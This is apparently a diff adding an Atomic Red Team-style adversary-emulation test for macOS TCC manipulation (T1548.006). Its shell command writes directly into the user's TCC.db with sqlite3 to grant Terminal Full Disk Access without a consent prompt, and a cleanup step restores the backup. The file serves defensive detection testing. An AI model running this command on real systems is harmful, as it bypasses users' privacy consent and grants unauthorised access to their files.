@@ -1,0 +1,39 @@
+attack_technique: T1548.006
+display_name: 'Abuse Elevation Control Mechanism: TCC Manipulation'
+atomic_tests:
+- name: Grant TCC Permission via Direct TCC.db Manipulation
+  auto_generated_guid: ad89fe1d-ddb4-411f-8e0d-7356550b761f
+  description: |
+    Directly inserts a row into the user's TCC (Transparency, Consent, and Control) database to grant
+    a named application a sensitive permission (e.g. Full Disk Access) without triggering the standard
+    consent prompt. On a stock macOS system with System Integrity Protection (SIP) enabled, this will
+    fail because `tccd` and its database are SIP-protected; the attempt itself is what security tooling
+    should be validated against. This mirrors the technique described by CloudMensis and covered in
+    TCC-focused macOS research.
+
+    Reference: https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/
+  supported_platforms:
+  - macos
+  input_arguments:
+    tcc_db:
+      description: Path to the target TCC database.
+      type: path
+      default: $HOME/Library/Application Support/com.apple.TCC/TCC.db
+    bundle_id:
+      description: Bundle identifier of the application to grant the permission to.
+      type: string
+      default: com.apple.Terminal
+    service:
+      description: TCC service identifier to grant (e.g. Full Disk Access).
+      type: string
+      default: kTCCServiceSystemPolicyAllFiles
+  executor:
+    command: |
+      cp "#{tcc_db}" /tmp/T1548.006_TCC.db.bak
+      sqlite3 "#{tcc_db}" "INSERT OR REPLACE INTO access (service,client,client_type,auth_value,auth_reason,auth_version) VALUES ('#{service}','#{bundle_id}',0,2,3,1);"
+      sqlite3 "#{tcc_db}" "SELECT service,client,auth_value FROM access WHERE client='#{bundle_id}';"
+    cleanup_command: |
+      cp /tmp/T1548.006_TCC.db.bak "#{tcc_db}"
+      rm -f /tmp/T1548.006_TCC.db.bak
+    name: bash
+    elevation_required: false
